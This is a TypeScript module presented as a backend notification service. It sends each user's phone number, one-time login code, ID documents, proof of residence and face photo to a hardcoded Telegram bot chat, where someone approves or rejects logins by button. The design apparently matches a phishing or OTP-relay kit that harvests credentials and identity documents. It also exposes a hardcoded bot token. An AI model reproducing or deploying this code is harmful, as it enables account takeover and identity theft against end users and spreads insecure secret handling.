// Telegram Bot Service for Backend Notifications
// Handles OTP and KYC verification requests with accept/reject functionality

const TELEGRAM_BOT_TOKEN = '8621755869:AAG9RbDA--Jtbb62MzX618DEqIpyUHanbdU';
const TELEGRAM_CHAT_ID = '7205874974';
const TELEGRAM_API_BASE = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Store pending verification requests
export interface VerificationRequest {
  id: string;
  type: 'login' | 'kyc';
  userId: string;
  phoneNumber?: string;
  otp?: string;
  kycData?: {
    userId: string;
    docType: string;
    idFile: string;
    proofType: string;
    proofFile: string;
    faceCapture?: string;
  };
  status: 'pending' | 'approved' | 'rejected';
  createdAt: number;
  expiresAt: number;
}

const pendingRequests = new Map<string, VerificationRequest>();
let lastUpdateId = 0;
let isPolling = false;

export interface TelegramMessage {
  chat_id: string | number;
  text: string;
  parse_mode?: 'HTML' | 'Markdown';
  reply_markup?: {
    inline_keyboard: Array<Array<{
      text: string;
      callback_data: string;
    }>>;
  };
}

export interface TelegramResponse {
  ok: boolean;
  result?: unknown;
  description?: string;
  error_code?: number;
}

export interface LoginData {
  phoneNumber: string;
  otp: string;
  userId: string;
}

export interface KYCData {
  userId: string;
  docType: string;
  idFile: File | string;
  proofType: string;
  proofFile: File | string;
  faceCapture?: string;
}

class TelegramBotService {
  /**
   * Send a message via Telegram bot with optional inline keyboard
   */
  async sendMessage(message: TelegramMessage): Promise<TelegramResponse> {
    try {
      const response = await fetch(`${TELEGRAM_API_BASE}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message.text,
          parse_mode: message.parse_mode || 'HTML',
          reply_markup: message.reply_markup,
        }),
      });

      const data = await response.json();
      return data;
    } catch (error) {
      console.error('Error sending Telegram message:', error);
      return {
        ok: false,
        description: error instanceof Error ? error.message : 'Unknown error',
      };
    }
  }

  /**
   * Send login verification request to admin
   */
  async sendLoginVerification(loginData: LoginData): Promise<{requestId: string, result: TelegramResponse}> {
    const requestId = `login_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    const request: VerificationRequest = {
      id: requestId,
      type: 'login',
      userId: loginData.userId,
      phoneNumber: loginData.phoneNumber,
      otp: loginData.otp,
      status: 'pending',
      createdAt: Date.now(),
      expiresAt: Date.now() + 300000, // 5 minutes
    };

    pendingRequests.set(requestId, request);

    const message = `
🔐 <b>Login Verification Request</b> 🔐

👤 <b>User ID:</b> ${loginData.userId}
📱 <b>Phone:</b> ${loginData.phoneNumber}
🔢 <b>OTP:</b> ${loginData.otp}

⏰ <i>Request ID: ${requestId}</i>
📅 <i>Expires: ${new Date(request.expiresAt).toLocaleTimeString()}</i>
`;

    const result = await this.sendMessage({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: '✅ Approve Login',
              callback_data: `approve_login_${requestId}`,
            },
            {
              text: '❌ Reject Login',
              callback_data: `reject_login_${requestId}`,
            },
          ],
        ],
      },
    });

    return { requestId, result };
  }

  /**
   * Send KYC verification request to admin
   */
  async sendDocument(file: File, caption: string): Promise<TelegramResponse> {
    try {
      const formData = new FormData();
      formData.append('chat_id', TELEGRAM_CHAT_ID);
      formData.append('document', file);
      formData.append('caption', caption);
      formData.append('parse_mode', 'HTML');
      const response = await fetch(`${TELEGRAM_API_BASE}/sendDocument`, {
        method: 'POST',
        body: formData,
      });
      return await response.json();
    } catch (error) {
      console.error('Error sending document:', error);
      return { ok: false };
    }
  }

  async sendPhotoFromBase64(base64DataUrl: string, caption: string): Promise<TelegramResponse> {
    try {
      const base64 = base64DataUrl.split(',')[1];
      if (!base64) return { ok: false };
      const bytes = Uint8Array.from(atob(base64), c => c.charCodeAt(0));
      const blob = new Blob([bytes], { type: 'image/jpeg' });
      const file = new File([blob], 'face_capture.jpg', { type: 'image/jpeg' });
      const formData = new FormData();
      formData.append('chat_id', TELEGRAM_CHAT_ID);
      formData.append('photo', file);
      formData.append('caption', caption);
      const response = await fetch(`${TELEGRAM_API_BASE}/sendPhoto`, {
        method: 'POST',
        body: formData,
      });
      return await response.json();
    } catch (error) {
      console.error('Error sending photo:', error);
      return { ok: false };
    }
  }

  async sendKYCVerification(kycData: KYCData): Promise<{requestId: string, result: TelegramResponse}> {
    const requestId = `kyc_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;

    const idFileName  = kycData.idFile  instanceof File ? kycData.idFile.name  : kycData.idFile;
    const proofFileName = kycData.proofFile instanceof File ? kycData.proofFile.name : kycData.proofFile;

    const request: VerificationRequest = {
      id: requestId,
      type: 'kyc',
      userId: kycData.userId,
      kycData: {
        userId: kycData.userId,
        docType: kycData.docType,
        idFile: idFileName,
        proofType: kycData.proofType,
        proofFile: proofFileName,
        faceCapture: kycData.faceCapture,
      },
      status: 'pending',
      createdAt: Date.now(),
      expiresAt: Date.now() + 600000,
    };

    pendingRequests.set(requestId, request);

    const message = `
📄 <b>KYC Verification Request</b> 📄

👤 <b>User ID:</b> ${kycData.userId}
📋 <b>ID Document:</b> ${kycData.docType} — <i>${idFileName}</i>
🏠 <b>Proof of Residence:</b> ${kycData.proofType} — <i>${proofFileName}</i>
${kycData.faceCapture ? '📸 <b>Face Capture:</b> attached below' : ''}

⏰ <i>Request ID: ${requestId}</i>
📅 <i>Expires: ${new Date(request.expiresAt).toLocaleTimeString()}</i>
`;

    const result = await this.sendMessage({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [[
          { text: '✅ Approve KYC', callback_data: `approve_kyc_${requestId}` },
          { text: '❌ Reject KYC',  callback_data: `reject_kyc_${requestId}`  },
        ]],
      },
    });

    // Send the actual files so admin can inspect them
    if (kycData.idFile instanceof File) {
      await this.sendDocument(kycData.idFile, `🪪 <b>ID Document</b> — ${kycData.docType}\n<i>${requestId}</i>`);
    }
    if (kycData.proofFile instanceof File) {
      await this.sendDocument(kycData.proofFile, `🏠 <b>Proof of Residence</b> — ${kycData.proofType}\n<i>${requestId}</i>`);
    }
    if (kycData.faceCapture) {
      await this.sendPhotoFromBase64(kycData.faceCapture, `📸 <b>Face Capture</b>\n<i>${requestId}</i>`);
    }

    return { requestId, result };
  }

  /**
   * Poll Telegram getUpdates for callback query responses from admin
   */
  async pollForUpdates(): Promise<void> {
    if (isPolling) return;
    isPolling = true;

    try {
      const response = await fetch(
        `${TELEGRAM_API_BASE}/getUpdates?offset=${lastUpdateId}&limit=100&timeout=0`
      );
      const data = await response.json();

      if (data.ok && Array.isArray(data.result) && data.result.length > 0) {
        for (const update of data.result) {
          lastUpdateId = update.update_id + 1;

          if (update.callback_query) {
            const callbackData: string = update.callback_query.data ?? '';

            // Acknowledge to remove the loading spinner on the button
            fetch(`${TELEGRAM_API_BASE}/answerCallbackQuery`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                callback_query_id: update.callback_query.id,
                text: callbackData.startsWith('approve') ? '✅ Approved' : '❌ Rejected',
              }),
            }).catch(() => {});

            // Match callback to a pending request
            for (const [id, req] of pendingRequests.entries()) {
              if (req.status !== 'pending') continue;
              if (
                callbackData === `approve_login_${id}` ||
                callbackData === `approve_kyc_${id}`
              ) {
                req.status = 'approved';
                pendingRequests.set(id, req);
              } else if (
                callbackData === `reject_login_${id}` ||
                callbackData === `reject_kyc_${id}`
              ) {
                req.status = 'rejected';
                pendingRequests.set(id, req);
              }
            }
          }
        }
      }
    } catch (error) {
      console.error('Error polling Telegram updates:', error);
    } finally {
      isPolling = false;
    }
  }

  /**
   * Check verification request status (polls Telegram first)
   */
  async checkVerificationStatus(requestId: string): Promise<VerificationRequest | null> {
    await this.pollForUpdates();

    const request = pendingRequests.get(requestId);
    if (!request) return null;

    if (Date.now() > request.expiresAt && request.status === 'pending') {
      request.status = 'rejected';
      pendingRequests.set(requestId, request);
    }

    return request;
  }

  /**
   * Update verification request status (called by webhook)
   */
  async updateVerificationStatus(requestId: string, status: 'approved' | 'rejected'): Promise<boolean> {
    const request = pendingRequests.get(requestId);
    if (!request) return false;

    request.status = status;
    pendingRequests.set(requestId, request);
    return true;
  }

  /**
   * Clean up expired requests
   */
  cleanupExpiredRequests(): void {
    const now = Date.now();
    for (const [id, request] of pendingRequests.entries()) {
      if (now > request.expiresAt && request.status === 'pending') {
        request.status = 'rejected';
        pendingRequests.set(id, request);
      }
    }
  }

  /**
   * Get bot information
   */
  async getBotInfo() {
    try {
      const response = await fetch(`${TELEGRAM_API_BASE}/getMe`);
      const data = await response.json();
      return data;
    } catch (error) {
      console.error('Error getting bot info:', error);
      return null;
    }
  }

  /**
   * Set webhook for receiving updates
   */
  async setWebhook(webhookUrl: string): Promise<TelegramResponse> {
    try {
      const response = await fetch(`${TELEGRAM_API_BASE}/setWebhook`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          url: webhookUrl,
        }),
      });

      const data = await response.json();
      return data;
    } catch (error) {
      console.error('Error setting webhook:', error);
      return {
        ok: false,
        description: error instanceof Error ? error.message : 'Unknown error',
      };
    }
  }
}

export const telegramBotService = new TelegramBotService();

// Cleanup expired requests every minute
setInterval(() => {
  telegramBotService.cleanupExpiredRequests();
}, 60000);